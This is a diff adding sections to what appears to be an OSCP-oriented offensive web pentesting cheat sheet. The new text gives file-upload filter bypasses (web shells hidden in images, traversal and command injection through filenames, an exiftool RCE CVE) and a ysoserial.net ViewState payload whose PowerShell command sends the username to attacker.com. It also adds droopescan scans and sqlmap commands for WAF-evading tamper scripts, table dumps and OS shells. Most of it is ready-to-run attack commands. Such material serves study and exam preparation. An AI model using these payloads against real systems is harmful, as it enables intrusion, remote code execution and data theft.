@@ -85,6 +85,18 @@ cat innocent.jpg shell.php > polyglot.php.jpg
 
 ---
 
+### 1.5a Additional Bypass Patterns
+
+- **IIS semicolon trick**: `shell.asp;.jpg` — IIS treats everything before `;` as the parsed extension, executing as ASP while some filters only check the suffix.
+- **PNG IDAT chunk embedding**: hide a PHP shell inside the IDAT chunk to survive `imagecopyresized`/`imagecopyresampled` re-encoding.
+- **Path traversal via filename**: `../../var/www/html/shell.php` in the filename field to write outside the intended upload directory.
+- **Command injection via filename**: filenames like `` $(whoami).jpg `` or backtick-based names, relevant when the filename is later passed unsanitized to a shell command (e.g. ImageMagick/exiftool processing).
+- **Vulnerable image processors**: exiftool 7.44–12.23 RCE via crafted DjVu file metadata (CVE-2021-22204) when uploaded images are processed server-side.
+
+**Reference:** https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html · https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
+
+---
+
 ### 1.5 .htaccess / Config-file Upload Attack
 **Explanation:** If the upload directory permits `.htaccess` (Apache) and doesn't restrict it, upload one that reinterprets a "safe" extension as PHP, then upload the payload with that extension.
 
@@ -147,6 +159,19 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections6 '
 Look for serialized Java magic bytes in traffic/cookies to spot candidates: `AC ED 00 05` (hex) or `rO0` (base64-encoded start).
 
 **Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
+
+---
+
+### 2.2b .NET / ASP.NET ViewState Deserialization (ysoserial.net)
+**Explanation:** .NET port of ysoserial targeting `BinaryFormatter`/`ObjectStateFormatter` (ViewState). Exploiting `__VIEWSTATE` often requires the target's machine key (`validationKey`/`decryptionKey`) — recover leaked/default keys with **Blacklist3r** first. Pre-.NET 4.5 apps may accept an unencrypted `__VIEWSTATE` even with `ViewStateEncryptionMode=Always` if `__VIEWSTATEENCRYPTED` is stripped from the request.
+
+**Example:**
+```
+ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
+ysoserial.exe -p ViewState    # list ViewState-specific plugin options
+```
+
+**Reference:** https://github.com/pwntester/ysoserial.net · https://github.com/NotSoSecure/Blacklist3r (machine-key recovery) · https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet
 
 ---
 
@@ -240,6 +265,20 @@ Also check `wp-config.php` backups/exposure (`wp-config.php.bak`, `.old`, `~`) f
 
 ---
 
+### 3.4 droopescan — Drupal / Silverstripe scanner (non-WordPress CMS)
+**Explanation:** Plugin-based scanner similar in spirit to WPScan but for Drupal (and Silverstripe, Joomla via plugin support) — use when WPScan doesn't apply.
+
+**Example:**
+```bash
+pip install droopescan
+droopescan scan drupal -u http://target.com/         # basic Drupal scan
+droopescan scan -u http://target.com/                 # generic autodetect across supported CMSs
+droopescan scan drupal -u http://target.com/ -t 8 -o json   # threaded, JSON output
+```
+**Reference:** https://github.com/droope/droopescan
+
+---
+
 ## 4. Generic CMS / Framework Fingerprinting Workflow
 
 **Explanation:** Before attacking any web app, identify the underlying CMS/framework, exact version, and technology stack — this drives which exploit databases and technique sets (WordPress plugin CVEs vs Joomla component CVEs vs Drupalgeddon vs a custom framework) to pursue next. This is a standard early step in the OSCP web methodology.
@@ -274,6 +313,33 @@ General rule of thumb for the exam: fingerprint → version-pin → searchsploit
 
 **Reference:** https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html
 **Reference (CMSeeK):** https://github.com/Tuhinshubhra/CMSeeK
+
+---
+
+## 5. sqlmap — Tamper Scripts & Shell Escalation
+
+**Explanation:** Beyond `-u`/`--dbs`, sqlmap's tamper scripts rewrite the injection payload (encoding, comment insertion, casing tricks) to evade naive filters/WAFs, and the `--os-shell`/`--sql-shell` flags turn a confirmed injection into OS-level access where DBMS privileges allow it. Not currently documented elsewhere in this repo — sqlmap is a core OSCP tool.
+
+**Tamper scripts for filter/WAF evasion** (chain multiple with commas):
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --tamper=space2comment,charencode,between,randomcase
+```
+- `space2comment.py` — replaces spaces with `/**/` to defeat naive space filters
+- `apostrophemask.py` — replaces `'` with its UTF-8 full-width equivalent to bypass apostrophe blacklists
+- `charencode.py` / `chardoubleencode.py` — URL-encode (or double-encode) payload characters
+- `between.py` — replaces `>`/`<` comparisons with `NOT BETWEEN 0 AND #` constructs
+- Full list (~60 scripts): https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/
+
+**Enumeration and shell escalation:**
+```bash
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --dbs                        # full enumeration pass
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump                       # dump a table
+sqlmap -u "http://target.com/page?id=1" --sql-shell                                     # interactive SQL shell
+sqlmap -u "http://target.com/page?id=1" --os-cmd whoami                                 # single OS command
+sqlmap -u "http://target.com/page?id=1" --os-shell                                      # full OS shell (needs MySQL FILE priv or MSSQL xp_cmdshell etc.)
+sqlmap -u "http://target.com/search" --data="param1=blah&param2=blah" --cookie="JSESSIONID=..." -p param1 --level=5 --risk=3   # POST/cookie-based, target a specific param
+```
+**Reference:** https://github.com/sqlmapproject/sqlmap · https://svn.sqlmap.org/sqlmap/trunk/sqlmap/tamper/
 
 ---
 
